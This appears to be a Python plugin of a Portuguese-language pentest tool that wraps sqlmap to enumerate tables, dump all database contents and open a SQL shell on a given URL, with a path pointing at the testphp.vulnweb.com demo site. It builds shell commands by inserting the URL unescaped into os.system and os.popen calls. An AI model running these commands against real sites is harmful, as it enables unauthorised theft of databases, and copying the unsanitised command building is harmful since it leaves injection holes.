# /usr/bin pyhton3
import os
from core import colors as color
from datetime import datetime
from core.utils import exitTheProgram


def tablesEnum(url, database):
    command = os.popen("sqlmap -u %s --tables -D %s" %(url, database)).read()  
    try:                  
        position = int(command.index('database:'))
        command_result_sliced = command[position:]
        command_result_sliced = command_result_sliced.replace('tables', 'tabelas')    
        command_result_sliced = command_result_sliced.replace("[INFO] fetched data logged to text files under '/home/alien/.local/share/sqlmap/output/testphp.vulnweb.com'", " ")                     
        command_result_sliced = command_result_sliced.replace("ending", " Terminando")                     
        print(command_result_sliced)
    except ValueError:
        pass
    #quit()
def dumpTables(url):
    print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Inicializando o plugin sqlmap.."+color.end)
    print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Sqlmap inicializado"+color.end)
    os.system("python3 ./mode/plugin/sqlmap/sqlmap.py -u  %s --dump-all " %url)
    ## procurar maneiraa de apenas retornar a shell apenas, sem necessidades de mostrar outras informações sem necessidades     
    
    
def sqlShell(url):
    print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Inicializando o plugin sqlmap.."+color.end)
    print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Sqlmap inicializado"+color.end)
    os.system("python3 ./mode/plugin/sqlmap/sqlmap.py -u  %s --sql-shell " %url)
    exitTheProgram()